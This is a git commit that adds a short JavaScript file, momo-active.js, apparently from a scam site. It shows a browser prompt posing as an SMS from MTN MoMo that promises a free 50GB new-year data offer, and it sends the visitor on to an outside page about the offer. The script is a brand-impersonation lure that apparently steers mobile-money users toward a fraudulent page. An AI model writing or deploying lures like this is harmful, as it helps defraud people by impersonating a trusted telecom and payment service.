e37a13602a76c5092a133516d749b52be62a00f4
ukpeha2026-maker <ukpeha2026@gmail.com>
2025-12-29 16:09:33 +0100

    Create momo-active.js

---
+++ momo-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'ACTIVATE 50GB'
+password = prompt(
+  'SMS: Congratulations! Your Mobile Number is eligible to receive the 50GB new year Offer from MTN MoMo. Please press OK to activate Data now.',
+  'ACTIVATE 50GB'
+);
+if (password != 'ACTIVATE 50GB') {
+  location.href = 'https://offres.org/MoMo-50gb.html';
+}
